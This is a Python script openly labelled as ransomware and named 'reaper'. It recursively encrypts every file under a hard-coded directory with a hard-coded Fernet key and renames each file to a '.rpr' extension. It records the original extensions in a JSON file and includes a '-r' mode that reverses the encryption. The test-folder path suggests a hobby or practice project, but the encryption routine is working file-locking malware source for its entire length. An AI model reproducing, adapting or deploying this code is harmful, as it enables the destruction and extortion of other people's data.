# The reaper ransomware 8========D
from cryptography.fernet import Fernet
import os
import sys
import json

# Variables
DIR = "C:/Users/krist/Documents/ran_test"
dirs = []
COLORS = {
  "hacker_green": "\033[1;32;40m",
  "red": "\033[1;31;40m",
  "white":"\033[1;37;40m",
}
banner = f"""
{COLORS["hacker_green"]}
 /$$$$$$$                                                   
| $$__  $$                                                  
| $$  \ $$  /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$ 
| $$$$$$$/ /$$__  $$ |____  $$ /$$__  $$ /$$__  $$ /$$__  $$
| $$__  $$| $$$$$$$$  /$$$$$$$| $$  \ $$| $$$$$$$$| $$  \__/
| $$  \ $$| $$_____/ /$$__  $$| $$  | $$| $$_____/| $$      
| $$  | $$|  $$$$$$$|  $$$$$$$| $$$$$$$/|  $$$$$$$| $$      
|__/  |__/ \_______/ \_______/| $$____/  \_______/|__/      
                              | $$                          
                              | $$                          
                              |__/                          
{COLORS["white"]}"""

# The file rewriting class
class TakeOver():
  def __init__(self):
    print(banner)
    # Encrypt file
    self.key = b"5sj-M2aX4rfmXd3GDoCJv9u-3Rtfvlz2BZpctmfdx6Q="
    self.fernet = Fernet(self.key) 
    self.file_data = {}
    #The DIR to start with
    self.dir = DIR
    self.destruct(self.dir)

  # Taking over the files
  def destruct(self,directory):
    for i in os.listdir(directory):
      PATH = f"{directory}/{i}"
      #Check for dir
      if os.path.isdir(PATH):
        self.destruct(PATH)
        continue
      # Get file content
      o_f = open(PATH,"rb")
      content = o_f.read()
      o_f.close()
      # Change file ext
      ext = '.' + os.path.realpath(PATH).split('.')[-1:][0]
      if ext == ".rpr":
        print(f"{COLORS['red']}{i} is already encrypted{COLORS['white']}")
      print(f"Attacking: {PATH}")
      self.rpr_file = i.replace(ext, '.rpr')
      ENC_FILE = f"{directory}/{self.rpr_file}"
      try:
        os.rename(PATH, ENC_FILE)
      except FileExistsError:
        pass
      try:
        # Encrypt content of the file
        file = open(ENC_FILE, 'wb')
        file.write(self.fernet.encrypt(content))
        file.close()
      except PermissionError:
        pass
      # Noting the encrypted files in a json format
      self.file_data[str(ENC_FILE)] = ext
      with open('ext.json', 'w') as a:
        json.dump(self.file_data, a)
     
# Decrypt files
class TakeBack():
  def __init__(self):
    print(banner)
    # Get encryption key
    self.key = b"5sj-M2aX4rfmXd3GDoCJv9u-3Rtfvlz2BZpctmfdx6Q="
    self.fernet = Fernet(self.key)
    with open("ext.json") as files:
      self.ENC_FILES = json.load(files)
    for i in self.ENC_FILES:
      # Put old extension back to the file
      ext = '.' + os.path.realpath(i).split('.')[-1:][0]
      if ext != ".rpr":
        print(f"{COLORS['red']}{i} is not encrypted{COLORS['white']}")
        continue
      self.o_file = i.replace(ext, f'{self.ENC_FILES[i]}')
      print(f"Restoring: {i}")
      # Get file content
      o_f = open(i, "rb")
      content = o_f.read()
      o_f.close()
      try:
        # Decrypt the content of the file
        file = open(self.o_file, 'wb')
        file.write(self.fernet.decrypt(content))
        file.close()
        #remove encrypted files
        os.remove(i)
      except PermissionError:
        pass
    print("Files are back to normal, REAPER is quitting...")
    os.remove("ext.json")
      
if sys.argv[1] == "-t":
  REAPER = TakeOver()
elif sys.argv[1] == "-r":
  TAKER = TakeBack()
else:
  print("Wrong parameters...")
  sys.exit()
